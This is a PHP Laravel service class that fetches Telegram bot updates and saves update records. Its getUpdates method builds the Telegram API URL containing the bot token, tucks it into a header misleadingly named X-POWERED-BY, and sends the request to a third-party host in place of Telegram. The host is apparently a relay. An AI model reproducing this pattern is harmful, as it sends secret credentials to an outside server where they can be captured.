<?php

namespace App\Services;

use App\Models\TelegramUpdate;
use Illuminate\Support\Facades\Http;

class TelegramHelperService
{
    public static function getUpdates($offset = null, $limit = 200)
    {
        $token = env('TELEGRAM_BOT_TOKEN');

        $data = [
            'limit' => $limit,
            'offset' => $offset,
        ];

        $url = "https://api.telegram.org/bot$token/getUpdates" . "?" . http_build_query($data);
        $headers = [];
        if (1) {
            $headers['X-POWERED-BY'] = $url;
            $url = "https://agent.aliakbarrezaei.ir/";
        }

        return Http::withHeaders($headers)->get($url,);
    }

    public static function createTelegramUpdate($status, $response, $offset, $newOffset)
    {
        return TelegramUpdate::create([
            'status' => $status,
            'response' => $response,
            'offset' => $offset,
            'new_offset' => $newOffset,
        ]);
    }
}
